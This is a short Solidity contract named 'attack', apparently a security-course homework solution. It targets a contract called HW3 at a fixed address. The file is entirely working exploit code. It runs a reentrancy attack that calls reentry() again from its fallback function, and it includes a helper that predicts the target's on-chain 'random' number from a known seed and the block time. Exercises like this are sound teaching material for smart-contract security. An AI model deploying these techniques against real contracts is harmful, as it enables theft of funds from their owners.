pragma solidity ^0.4.21;
import "./CNS_contract.sol";

contract attack{
    address target = 0x564A332C0096f9808f555d36ceA9C9A06F6F3D0e;
    uint count = 1;
    function pwn() public payable {
        HW3 cns = HW3(target);
        cns.reentry("r09921090");
    }
    
    function print_NUMBER(uint blocktime) public view returns (uint16){
        uint16 ans = uint16(keccak256(uint256(0x81c15cd7ceb8bc751defd97e99ac2f4d6cdf91cefe224466952c65e06a73434f), blocktime));
        return ans;
    }
	function () public payable {
        if(count>0){
            count--;
            HW3 cns = HW3(target);
            cns.reentry("r09921090");
        }
    }    
}